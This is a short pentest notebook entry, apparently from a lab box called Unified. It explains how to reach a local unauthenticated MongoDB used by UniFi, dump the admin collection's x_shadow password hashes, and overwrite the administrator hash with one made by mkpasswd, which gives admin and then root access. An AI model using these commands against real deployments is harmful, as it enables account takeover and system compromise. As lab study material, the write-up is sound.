---
tags: [technique, privesc, database, mongodb]
aliases: [MongoDB, mongo privesc, x_shadow]
---
# MongoDB Enumeration

> A local, unauthenticated MongoDB often stores application accounts, including password hashes. Writing a known hash into a user's record replaces its password → login as that user without cracking anything.

## When it applies
- a foothold shell can reach a MongoDB bound to localhost (on Unified: port **27117**, `bind_ip 127.0.0.1`, found via `ps aux` → the `mongod` process line)
- no authentication required locally → direct read/write access

## Connect
```bash
mongo --port 27117
```

## Enumerate
```sql
show dbs
db.admin.find()    -- web-admin accounts, incl. the x_shadow password hash
```
- `show dbs` → locate the application database (UniFi: `ace`)
- the `admin` collection holds the application's accounts
- the `x_shadow` field = the stored password hash

## Replace the password hash
The hash format is read from its prefix → `$6$` = **SHA-512 crypt**, so a matching hash is generated and written back.
```bash
mkpasswd -m sha-512 Password1234
# → $6$...   (new hash under a password I control)
```
```sql
db.admin.update({"name":"administrator"},{$set:{"x_shadow":"<new-hash>"}})
```
- overwriting `x_shadow` sets a known password → no offline cracking needed ([[Hash Cracking]] only if the original must be kept)

## Result
- login to the application as `administrator` with the chosen password → admin access
- on Unified this exposed the host's root SSH password in the site settings → `ssh root@<box>` → root

Related: [[Hash Cracking]] · [[etc-passwd]]
